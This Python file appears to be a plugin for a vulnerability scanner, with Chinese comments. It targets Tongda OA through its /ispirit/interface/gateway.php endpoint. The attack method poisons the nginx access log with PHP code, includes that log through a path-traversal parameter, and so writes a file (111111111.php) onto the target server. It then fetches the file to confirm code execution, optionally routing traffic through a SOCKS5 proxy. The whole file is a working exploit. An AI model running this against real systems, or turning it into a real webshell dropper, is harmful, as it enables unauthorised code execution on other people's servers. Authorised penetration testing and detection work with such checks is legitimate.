from urllib import request as urlRequests
from termcolor import cprint
import requests
import re
import socks
import socket
from urllib import parse
from tqdm import *
from colorama import Fore

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)



class Detect:
    name = 'Tongda'

    def __init__(self, url, vul_list, requests_proxies):
        self.url = url
        self.vul_list = vul_list                    # 存储漏洞的名字和url
        self.requests_proxies = requests_proxies
        if requests_proxies:
            self.ip, self.port = re.search('socks5://(.*)\', ', str(requests_proxies)).group(1).split(':')      # 重新匹配出ip和端口
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, self.ip, int(self.port))
            socket.socket = socks.socksocket
            socket.setdefaulttimeout(0.01)  # 0.01恰好

        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'}
        self.Exist = False

    def run_detect(self):

        self.attack()

        if self.Exist == True:
            return True
        else:
            return False

    # 只需要修改下面的代码就行
    def attack(self):
        try:
            url1 = self.url + r"/ispirit/interface/gateway.php?json{}&a=<?php file_put_contents ('111111111.php','1111111111111111111'); ?>"
            url2 = self.url + r"/ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log"

            req1 = urlRequests.Request(url1)
            req1.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0')
            urlRequests.urlopen(req1)


            req2 = urlRequests.Request(url2)
            req2.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0')
            urlRequests.urlopen(req2)

            webshell_path = r'{}//ispirit/interface/111111111.php'.format(self.url)
            res = requests.get(url=webshell_path, headers=self.headers, proxies=self.requests_proxies)

            if '1111111111111111111' in res.text:
                cprint('[Tongda Upload-Include] {}'.format(webshell_path), 'red')
                self.vul_list.append(['Tongda Upload-Include', webshell_path, 'YES'])
                self.Exist = True
        except Exception as e:
            print(e.args)


if __name__ == '__main__':
    from queue import Queue

    vul_list = []
    # proxy = r'192.168.168.148:10086'
    # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    requests_proxies = None
    url = r'http://www.domain.com'
    Detect(url, vul_list, requests_proxies).run_detect()

    tqdm.write(Fore.BLACK + '-' * 50 + '结果' + '-' * 50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))
